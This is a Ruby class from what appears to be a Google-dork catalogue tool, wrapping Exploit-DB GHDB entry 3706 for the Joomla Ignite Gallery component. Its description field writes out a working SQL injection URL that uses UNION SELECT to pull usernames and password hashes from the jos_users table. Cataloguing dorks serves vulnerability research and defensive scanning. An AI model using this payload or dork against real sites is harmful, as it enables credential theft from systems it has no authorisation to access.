module Dorks
   class Dork3706 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3706",
            ghdb_url: "https://www.exploit-db.com/ghdb/3706",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2011-03-27",
            author: "anonymous",
            dork: <<~EDORK,
index.php?option=com_ignitegallery
EDORK
            description: <<~EDESC
Submitter: TiGeR_YeMeN HaCkEr SQL Injection: index.php?option=com_ignitegallery&task=view&gallery=-1+union+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10+from+jos_users--
EDESC
         })

      end
   end
end
